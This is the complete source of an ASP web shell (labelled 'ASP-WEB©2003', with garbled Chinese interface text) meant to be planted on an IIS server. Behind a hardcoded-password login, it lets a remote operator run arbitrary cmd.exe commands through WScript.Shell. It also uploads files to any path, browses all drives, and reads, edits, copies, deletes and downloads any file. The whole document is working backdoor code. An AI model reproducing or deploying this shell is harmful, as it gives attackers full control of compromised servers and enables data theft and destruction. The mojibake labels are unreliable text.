   <%@codepage=936%><style>body{font-size:9pt;color:blue}table{font-family:ËÎÌå;font-size:9pt}a{font-family:ËÎÌå;font-size:9pt;color:blue;text-decoration:none}a:hover{font-family:ËÎÌå;color:red;text-decoration:none}input{BORDER-RIGHT:blue 1px solid;BORDER-TOP:blue 1px solid;BACKGROUND:white;BORDER-LEFT:blue 1px solid;BORDER-BOTTOM:blue 1px solid;FONT-FAMILY:Verdana,Arial font-color:white;FONT-SIZE:9pt;}</style><%Response.Expires=0
   Co=Request.ServerVariables("URL")
   zc="<b>ASP-WEB&copy2003"
   if session("lZ")="lk"then
   Session.TimeOut=50
   Session(Co)=0
   if request("up")=1 then
   Server.ScriptTimeOut=3000%><SCRIPT RUNAT=SERVER LANGUAGE=VBSCRIPT>dim zh
   CLASS zha
   dim isForm,isFile
   Public function Form(strForm)
   Form=isForm(lcase(strForm))
   if not isForm.exists(strForm)then Form=""
   end function
   Public function File(strFile)
   File=isFile(lcase(strFile))
   if not isFile.exists(strFile)then File=new FileInfo
   end function
   Private Sub CLASS_Initialize
   dim Rq,sStart,vbCrlf,sInfo,iInfoStart,iInfoEnd,tZ,iStart,theFile,iFileSize,sFilePath,sFileType,sFormValue,sFileName,iFindStart,iFindEnd,iFormStart,iFormEnd,sFormName
   set isForm=CreateObject("Scripting.Dictionary")
   set isFile=CreateObject("Scripting.Dictionary")
   set tZ=CreateObject("adodb.stream")
   set zh=CreateObject("adodb.stream")
   zh.Type=1
   zh.Mode=3
   zh.Open
   zh.Write Request.BinaryRead(Request.TotalBytes)
   zh.Position=0
   Rq=zh.Read
   iFormStart=1
   iFormEnd=LenB(Rq)
   vbCrlf=chrB(13)&chrB(10)
   sStart=MidB(Rq,1,InStrB(iFormStart,Rq,vbCrlf)-1)
   iStart=LenB(sStart)
   iFormStart=iFormStart+iStart+1
   while (iFormStart+10)<iFormEnd
   iInfoEnd=InStrB(iFormStart,Rq,vbCrlf&vbCrlf)+3
   tZ.Type=1
   tZ.Mode=3
   tZ.Open
   zh.Position=iFormStart
   zh.CopyTo tZ,iInfoEnd-iFormStart
   tZ.Position=0
   tZ.Type=2
   tZ.Charset="gb2312"
   sInfo=tZ.ReadText
   tZ.Close
   iFormStart=InStrB(iInfoEnd,Rq,sStart)
   iFindStart=InStr(22,sInfo,"name=""",1)+6
   iFindEnd=InStr(iFindStart,sInfo,"""",1)
   sFormName=lcase(Mid(sinfo,iFindStart,iFindEnd-iFindStart))
   if InStr(45,sInfo,"filename=""",1)>0 then
   set theFile=new FileInfo
   iFindStart=InStr(iFindEnd,sInfo,"filename=""",1)+10
   iFindEnd=InStr(iFindStart,sInfo,"""",1)
   sFileName=Mid(sinfo,iFindStart,iFindEnd-iFindStart)
   theFile.FileName=getFileName(sFileName)
   theFile.filePath=getFilePath(sFileName)
   iFindStart=InStr(iFindEnd,sInfo,"Content-Type:",1)+14
   iFindEnd=InStr(iFindStart,sInfo,vbCr)
   theFile.FileType=Mid(sinfo,iFindStart,iFindEnd-iFindStart)
   theFile.FileStart=iInfoEnd
   theFile.FileSize=iFormStart-iInfoEnd-3
   theFile.FormName=sFormName
   if not isFile.Exists(sFormName)then
   isFile.add sFormName,theFile
   end if
   else
   tZ.Type=1
   tZ.Mode=3
   tZ.Open
   zh.Position=iInfoEnd
   zh.CopyTo tZ,iFormStart-iInfoEnd-3
   tZ.Position=0
   tZ.Type=2
   tZ.Charset="gb2312"
   sFormValue=tZ.ReadText
   tZ.Close
   if isForm.Exists(sFormName)then
   isForm(sFormName)=isForm(sFormName)&","&sFormValue
   else
   isForm.Add sFormName,sFormValue
   end if end if
   iFormStart=iFormStart+iStart+1
   wend
   Rq=""
   set tZ=nothing
   End Sub
   Private function GetFilePath(FullPath)
   If FullPath<>""Then
   GetFilePath=left(FullPath,InStrRev(FullPath,"\"))
   Else
   GetFilePath=""
   End If
   End function
   Private function GetFileName(FullPath)
   If FullPath<>""Then
   GetFileName=mid(FullPath,InStrRev(FullPath,"\")+1)
   Else
   GetFileName=""
   End If
   End function
   End CLASS
   CLASS FileInfo
   dim FileStart,FileSize,fileName,filePath,FileType,formName,dr
   Public function SAs(FullPath)
   set dr=CreateObject("Adodb.Stream")
   dr.Mode=3
   dr.Type=1
   dr.Open
   zh.position=FileStart
   zh.copyto dr,FileSize
   dr.SaveToFile FullPath,2
   dr.Close
   set dr=nothing
   end function
   End CLASS</SCRIPT><%dim upload,file,formPath
   set upload=new zha
   formPath=upload.isform("filepath")
   if right(formPath,1)<>"\"then formPath=formPath&"\"
   for each formName in upload.isFile
   set file=upload.isFile(formName)
   if file.fileName=""or file.filesize<0 then
   Response.Write"<a href=# onclick=history.go(-1)>ÎÄ¼þ?</a>"
   response.end
   end if
   file.SAs formPath&file.FileName
   Response.write"ÉÏ´«ÁË "&formPath&file.FileName&"</br>"
   set file=nothing
   next
   set upload=nothing
   response.write"<a href=# onclick=history.go(-1)>[·µ»Ø]</a>"
   response.end
   else
   on error resume next
   set fB=Server.CreateObject("Scripting.FileSystemObject")
   Set tN=Server.CreateObject("WSCRIPT.NETWORK")
   dN="\\"&tN.ComputerName&"\"&tN.UserName
   If -2147221005=Err then
   call MN()
   else
   select case request("id")
   case"edit"call edit()
   case"dir"call dir()
   case"down"call dlf(request("path"))
   case"pan"call pan()
   case"FS"call MN()
   case"out"call out()
   case else
   call mz()
   end select
   end if
   sub MN()
   set sa=server.createobject("shell.application")%><p align=center><table border=1 width=600 cellspacing=0 cellpadding=0 bgcolor=#dddddd><tr><td>·þÎñÆ÷Ãû</td><td width=360><a href="http://<%=Request.ServerVariables("SERVER_NAME")%>"target=_blank><%=Request.ServerVariables("SERVER_NAME")%></a></td></tr><tr><td>IP:¶Ë¿Ú  Ê±¼ä</td><td><%=Request.ServerVariables("LOCAL_ADDR")%>:<%=Request.ServerVariables("SERVER_PORT")%>¡¡<%=now%></td></tr><tr><td>CPUÊýÁ¿ OS</td><td><%=Request.ServerVariables("NUMBER_OF_PROCESSORS")%> ¸ö {<%=Request.ServerVariables("OS")%>}</td></tr><tr><td>¾ÖÓòÍøÖ·:</td><td><%=dN%></td></tr><tr><%dim t1,t2,ys,T3
   t1=timer
   for i=1 to 500000
   ys=1+1
   next
   t2=timer
   T3=cstr(int(((t2-t1)*10000)+0.5)/10)%><td>ÔËËãËÙ¶È</td><td><%=T3%> ºÁÃë(256M 2.4GÎª156.3ºÁÃë)</td></tr><tr bgcolor=white><td><font color=red>¿Í»§¶ËIP¡ú¶Ë¿Ú [ÎÞ´úÀí]</td><td><font color=red><%=Request.ServerVariables("REMOTE_ADDR")%>¡ú<%=Request.ServerVariables("REMOTE_PORT")%>
   [<%=Request.ServerVariables("HTTP_X_FORWARDED_FOR")%>]</td></tr><tr><td>±¾ÎÄ¼þ</td><td><%=server.mappath(Co)%></td></tr><TR><TD colspan=2><form name=form1 method=post action="<%=Co%>?up=1" enctype="multipart/form-data"> ¾ø¶ÔÂ·¾¶:<input type=text name=filepath value="<%=Server.MapPath(".")%>"size=87><BR></TD></tr><tr><td id=upid width=240>ÎÄ¼þ1<input type=file name=file></td><td valign=top><SCRIPT language=javascript>function sm(){str='';if(!window.form1.upcount.value)window.form1.upcount.value=1;for(i=1;i<=window.form1.upcount.value;i++)str+='ÎÄ¼þ'+i+'<input type=file name=file'+i+'><br>';window.upid.innerHTML=str+'';}</SCRIPT><INPUT type=button onclick=sm() value=Éè¶¨ name=Button> ÉÏ´« <INPUT value=1 name=upcount size=2 maxlength=2> ÎÄ¼þ <input type=submit value=ÉÏ´«> <INPUT type=reset value=ÖØÖÃ></td></TR></form></table><form method=POST><input type=submit name=sb value=Ö´ÐÐ> <input type=submit name=Subm value=·þÎñÆ÷±äÁ¿> <input type=submit name=tui value=ÍË³ö> <INPUT type=reset value=ÖØÖÃ> <%=timer%>
   <a href=<%=Co%>><%=zc%></a><BR>¸´ÖÆ:<input type=text name=text1> Ä¿µÄÂ·¾¶:<input type=text name=text2><br>ÒÆ¶¯:<input type=text name=text3> Ä¿µÄÂ·¾¶:<input type=text name=text4><br>³ÌÐò:<input type=text name=text5> ±ð¼Ó²ÎÊý:<input type=text name=text6><br>ä¯ÀÀ:<input type=text name=text> DOS ÃüÁî:<input type=text name=ok value="%COMSPEC% /c "></form><hr><%if Request.Form("tui")<>""then call out()
   if Request.Form("Subm")<>""then
   response.write"·þÎñÆ÷ËùÓÐ±äÁ¿</p>"
   for each Y in request.servervariables
   response.write""&Y&"<br>"&request.servervariables(Y)&"<HR>"
   next
   end if
   hz=Request.Form("ok")
   if hz<>""and hz<>"%COMSPEC% /c "then
   server.CreateObject("WScript.Shell").run ""&hz&"",1,True
   response.write"Ö´ÐÐÁË"&hz&""
   end if
   sz=Request.Form("text")
   if sz<>""then
   if right(sz,1)<>"\"then sz=sz&"\"
   for each Z in sa.namespace(sz).items
   response.write""&Z.path&"  --"&Z.size&"<br>"
   next
   end if
   z1=Request.Form("text1")
   z2=Request.Form("text2")
   if z1<>""and z2<>""then
   for i=len(z1) to 1 step -1
   if mid(z1,i,1)="\"then
   path=left(z1,i-1)
   exit for
   end if
   next
   if len(path)=2 then path=path&"\"
   path2=right(z1,len(z1)-i)
   sa.namespace(z2).copyhere sa.namespace(path).parsename(path2)
   response.write"ok!"
   end if
   z3=Request.Form("text3")
   z4=Request.Form("text4")
   if z3<>""and z4<>""then
   for i=len(z3) to 1 step -1
   if mid(z3,i,1)="\"then
   path=left(z3,i-1)
   exit for
   end if
   next
   if len(path)=2 then path=path&"\"
   path2=right(z3,len(z3)-i)
   sa.namespace(z4).movehere sa.namespace(path).parsename(path2)
   response.write"ok!"
   end if
   z5=Request.Form("text5")
   z6=Request.Form("text6")
   if z5<>""and z6<>""then
   sa.namespace(z5).items.item(z6).invokeverb
   response.write"ok!"
   end if
   set sa=Nothing
   end sub
   sub mz()
   dim cpath,lpath
   lpath=Request("path")&"/"
   if Request("ib")="true"then
   cpath=lpath
   ib="true"
   else
   cpath=Server.MapPath(lpath)
   ib=""
   end if%><script language=JavaScript>function crfile(ls){if (ls==""){alert("ÎÄ¼þÃû?");}else{window.open("<%=Co%>?id=edit&ib=<%=request("ib")%>&creat=Y&path=<%=Server.UrlEncode(lpath)%>"+ls);}return false;}function crdir(ls){if (ls==""){alert("Ä¿Â¼Ãû?");}else{window.open("<%=Co%>?id=dir&ib=<%=request("ib")%>&op=creat&path=<%=Server.UrlEncode(lpath)%>"+ls);}return false;}</script><script LANGUAGE=VBSCRIPT>ib="<%=request("ib")%>"
   sub rmdir(ls)
   if confirm("É¾³ý"&ls&"Ä¿Â¼?") then
   window.open"<%=Co%>?id=dir&path="&ls&"&op=del&ib="+ib
   end if
   end sub
   sub copyfile(sfile)
   dfile=trim(InputBox(""&Chr(13)&Chr(10)&"Ô´ÎÄ¼þ£º"&sfile&Chr(13)&Chr(10)&"Ä¿µÄÎÄ¼þ:"&Chr(13)&Chr(10)&"Ðí´øÂ·¾¶ Àýc:/»òc:\¾ù¿É"))
   if dfile<>""then
   window.open"<%=Co%>?id=edit&path="+sfile+"&op=copy&ib=true&dpath="+dfile
   else
   alert"ÎÄ¼þÃû?"
   end If
   end sub</script><center><TABLE border=1 cellSpacing=1 cellPadding=3 width=768 bgColor=#dddddd><tr><td colspan=4><a href=<%=Co%>?id=out title=ÍË³ö>±¾ÎÄ¼þ: <%=server.mappath(Co)%></a></td></tr><TD colspan=4 bgcolor=white>ÇÐ»»ÅÌ·û£º<%For Each thing in fB.Drives
   Response.write"<a href='"&Co&"?path="&thing.DriveLetter&":&ib=true'>"&thing.DriveLetter&"ÅÌ:</a> "
   NEXT%>¾ÖÓòÍøÖ·£º<%=dN%></TD><tr><TD align=center colspan=4><font color=red><%=Request.ServerVariables("REMOTE_ADDR")%>:<%=Request.ServerVariables("REMOTE_PORT")%> [<%=Request.ServerVariables("HTTP_X_FORWARDED_FOR")%>]</font><a href=<%=Co%>?id=pan> ´ÅÅÌÐÅÏ¢</a> <%=now%>¡¡<a href=<%=Co%>?id=FS><%=zc%></a></TD></tr><TD colspan=4 bgcolor=white><a href="<%=Co%><%if Request("ib")="true" then%>"title=»»µ½Ïà¶ÔÂ·¾¶<%else%>?ib=true"title=»»µ½¾ø¶ÔÂ·¾¶<%end if%>>Â·¾¶: <%=cpath%></a> µ±Ç°Ä¿Â¼:<%=lpath%></TD><TR><TD colspan=4><form action=<%=Co%> method=post>
   ä¯ÀÀ¡¼¾ø¶ÔÂ·¾¶¡½Ä¿Â¼: <input type=text name=path size=80 value=c:><input type=hidden name=ib value=true> <input type=submit value=ä¯ÀÀ></TD></form></TR><TR bgColor=white><TD colspan=4><form> ½¨ÌØÊâ·ûºÅÄ¿Â¼»òÎÄ¼þ #ÓÃ<%=Server.UrlEncode("#")%> %ÓÃ<%=Server.UrlEncode("%")%> &ÓÃ<%=Server.UrlEncode("&")%> +ÓÃ<%=Server.UrlEncode("+")%> =ÓÃ<%=Server.UrlEncode("=")%> <input type=text name=fn size=40> <input type=submit value=½¨ÎÄ¼þ onclick=crfile(fn.value)> <input type=button value=½¨Ä¿Â¼ onclick=crdir(fn.value)></TD></form></TR><TR><TD width=210 valign=top rowspan=2><%dim theFolder,theSubFolders,theFiles
   if fB.FolderExists(cpath)then
   Set theFolder=fB.GetFolder(cpath)
   Set theSubFolders=theFolder.SubFolders
   Response.write"<a href='"&Co&"?path="&Server.UrlEncode(Request("oldpath"))&"&ib="&ib&"'><b>¡ö¡üÉÏ¼¶Ä¿Â¼</b></a><br>"
   For Each x In theSubFolders
   Response.write"<a href='"&Co&"?path="&Server.UrlEncode(lpath&x.Name)&"&oldpath="&Server.UrlEncode(Request("path"))&"&ib="&ib&"'>©¸¡õ "&x.Name&"</a> <a href=# onclick=rmdir('"&Server.UrlEncode(lpath&x.Name)&"')>¡ÁÉ¾³ý</a><br>"
   Next%></TD><TD width=232>ÎÄ¼þ£¨Êó±êÒÆµ½ÎÄ¼þÃûÏÔÊ¾ÎÄ¼þÊôÐÔ£©</TD><TD width=74 >´óÐ¡£¨×Ö½Ú£©</TD><TD width=94>²Ù×÷</TD></TR><TR><TD colspan=3 valign=top bgColor=WHITE><table width=528 cellspacing=0 cellpadding=2><%Set theFiles=theFolder.Files
   For Each x In theFiles
   if Request("ib")="true" then
   showstring="<a href='"&Co&"?id=down&path="&Server.UrlEncode(lpath&x.Name)&"&ib="&ib&"'title='"&"ÀàÐÍ"&x.type&chr(10)&"ÊôÐÔ"&x.Attributes&chr(10)&"Ê±¼ä£º"&x.DateLastModified&"'target=_blank><b>"&x.Name&"</b></a>"
   else
   showstring="<a href='"&Server.UrlEncode(lpath&x.Name)&"'title='"&"ÀàÐÍ"&x.type&chr(10)&"ÊôÐÔ"&x.Attributes&chr(10)&"Ê±¼ä£º"&x.DateLastModified&"'target=_blank><b>"&x.Name&"</b></a>"
   end if
   Response.write"<tr><td width=360 style='border-bottom:1 solid blue'>"&showstring&"</td><td width=72 style='border-bottom:1 solid blue'>"&x.size&"</a></td><td width=92 style='border-bottom:1 solid blue'><a href="&Co&"?id=edit&path="&Server.UrlEncode(lpath&x.Name)&"&ib="&ib&" target=_blank>±à¼</a>&nbsp<a href="&Co&"?id=edit&path="&Server.UrlEncode(lpath&x.Name)&"&op=del&ib="&ib&">É¾³ý</a>"
   if Request("ib")="true"then Response.write"&nbsp<a href=# onclick=copyfile('"&Server.UrlEncode(lpath&x.Name)&"')>¸´ÖÆ</a>"
   Response.write"</td></tr>"
   Next
   end if%></table></TD></TR></TABLE><%end sub
   sub pan()
   For Each pa in fB.Drives
   On Error Resume Next
   pa1=pa.AvailableSpace
   if pa1/1024/1024<1024 then
   pa1=round(pa1/1024/1024*100)/100&" MB"
   else
   pa1=round(pa1/1024/1024/1024*100)/100&" GB"
   end if
   pa2=round(pa.TotalSize/1024/1024/1024*100)/100
   pa3=pa.DriveType
   select case pa3
   case 0
   pa3="Î´Öª"
   case 1
   pa3="ÈíÅÌ"
   case 2
   pa3="Ó²ÅÌ"
   case 3
   pa3="ÍøÂç"
   case 4
   pa3="¹âÇý"
   case 5
   pa3="RAMÅÌ"
   end select
   Response.write"<a href='"&Co&"?path="&pa.DriveLetter&":&ib=true'>"
   Response.write" "&pa3&" "&pa.DriveLetter&" &nbspÎÄ¼þÏµÍ³:"&pa.FileSystem&" &nbsp&nbspÈÝÁ¿&nbsp "&pa2&" GB &nbsp&nbsp&nbsp¿ÉÓÃ¿Õ¼ä&nbsp;"&pa1&" "&pa.IsReady&" "&pa.Path&" "&pa.RootFolder&" "&pa.SerialNumber&"</a><HR>"
   next
   end sub
   sub edit()
   if Request("ib")="true"then
   pF=Request("path")
   else
   pF=server.mappath(Request("path"))
   end if
   if request("op")="del"then
   Set ZF=fB.GetFile(pF)
   ZF.Delete True
   Response.write"<SCRIPT>alert('É¾³ýÁË "+REPLACE(pF,"\","/")+"');location.href='javascript:history.go(-1)'</SCRIPT>"
   else
   if request("op")="copy"then
   dsfile=Request("dpath")
   Set ZF=fB.GetFile(pF)
   ZF.copy dsfile
   Response.write"<SCRIPT>alert('¸´ÖÆ£º"+pF+" µ½£º"+REPLACE(dsfile,"\","/")+"');location.href='JavaScript:self.close()'</SCRIPT>"
   else
   if request.form("text")=""then
   if Request("creat")<>"Y"then
   Set ZF=fB.OpenTextFile(pF,1,False)
   Za=Server.HTMLEncode(ZF.readall)
   ZF.Close
   end if%><SCRIPT language=JavaScript>var i=0;var ie=(document.all)?1:0;var ns=(document.layers)?1:0;function selectCode(){if(document.pad.text.value.length>0){document.pad.text.focus();document.pad.text.select();}else alert('ÄÚÈÝ?')}function preview(){if(document.pad.text.value.length>0){pr=window.open("","Preview","scrollbars=1,menubar=1,status=1,width=700,height=320,left=50,top=110");pr.document.write(document.pad.text.value);}else alert('Ô¤ÀÀÄÚÈÝ?')}function uncompile(){if (document.pad.text.value.length>0){source=unescape(document.pad.text.value);document.pad.text.value=""+source+"";i++;alert("½âÃÜ"+i+"´Î!");}else alert('ÄÚÈÝ?')}</SCRIPT><form method=POST name=pad action="<%=Co%>?id=edit"><input type=hidden name=ib value="<%=Request("ib")%>"><CENTER><TD>±à¼ÎÄ¼þÃû£º<input type=text name=path value="<%=Request("path")%>"></TD><BR><TD><textarea rows=30 cols=100% name=text><%=Za%></textarea></TD><BR><TD><input type=submit value=Ìá½»> <INPUT onclick=selectCode() type=button value=È«Ñ¡>
   <INPUT onclick=preview() type=button value=Ô¤ÀÀ> <INPUT onclick=uncompile() type=button value=JAVA½âÃÜ> <INPUT type=reset value=ÖØÖÃ></TD></form><%else
   Set outfile=fB.CreateTextFile(pF)
   outfile.Write Request("text")
   outfile.close
   Response.write"<SCRIPT>alert('Íê³É£º"+Request("path")+"');location.href='JavaScript:self.close()'</SCRIPT>"
   end if end if end if
   end sub
   end if
   sub dir()
   if Request("ib")="true"then
   zp=Request("path")
   else
   zp=server.mappath(Request("path"))
   end if
   if request("op")="del"then
   fB.DeleteFolder zp,True
   Response.write"<SCRIPT>alert('É¾³ý:"&REPLACE(zp,"\","/")&"');location.href='JavaScript:self.close()'</SCRIPT>"
   else
   if request("op")="creat"then
   fB.CreateFolder zp
   Response.write"<SCRIPT>alert('½¨Ä¿Â¼:"&REPLACE(zp,"\","/")&"');location.href='JavaScript:self.close()'</SCRIPT>"
   end if end if
   end sub
   function dlf(strFile)
   strFilename=Request("path")
   Response.Buffer=True
   Response.Clear
   Set s=Server.CreateObject("ADODB.Stream")
   s.Open
   s.Type=1
   on error resume next
   Set f=fB.GetFile(strFilename)
   intFilelength=f.size
   s.LoadFromFile(strFilename)
   Response.AddHeader"Content-Disposition","attachment;filename="&f.name
   Response.AddHeader"Content-Length",intFilelength
   Response.CharSet="UTF-8"
   Response.ContentType="application/octet-stream"
   Response.BinaryWrite s.Read
   s.Close
   Set s=Nothing
   End Function
   function out()
   Session.Abandon
   response.redirect""&Co&""
   End Function
   else
   randomize timer
   regjm=int(rnd*8998)+1000%><center><%=zc%><script language=javascript>function check(){var mjj=document.adm;if(mjj.admid.value.length<=0){alert("Ãû×Ö£¿");mjj.admid.focus();return false;}if(mjj.admpw.value.length<=0){alert("ÃÜÂë£¿");mjj.admpw.focus();return false;}if(mjj.rz.value.length<=0){alert("ÈÏÖ¤Âë£¿");mjj.rz.focus();return false;}var n2=mjj.rz1.value;if(mjj.rz.value!=n2){window.alert('ÈÏÖ¤Âë: '+n2+'');mjj.rz.focus();return false;}}</script><%if request.form("admid")<>""and request.form("admid")<>"lan"then response.write"Ãû×Ö?"
   if request.form("admpw")<>""and request.form("admpw")<>"hunke1314"then response.write"ÃÜÂë?"
   if request.form("admid")="hunke"and request.form("admpw")="hunke1314"then
   session("lZ")="lk"
   response.redirect""&Co&""
   else
   Session(Co)=Session(Co)+1
   if Session(Co)=4 then response.redirect"http://"&Request.ServerVariables("SERVER_NAME")&""
   if Session(Co)>4 then response.write"<script>self.window();</script>"%><form method=post name=adm onsubmit="return check()">Ãû×Ö: <input type=password name=admid><br>ÃÜÂë: <input type=password name=admpw><input type=hidden name=rz1 value=<%=regjm%>><BR>ÈÏÖ¤: <input type=password name=rz size=14> <%=regjm%><br>»á»°ID:<%=Session.SessionID%> <input type=submit value=µÇÂ¼> <%=Session(Co)%> ´Î</form><%end if end if%>
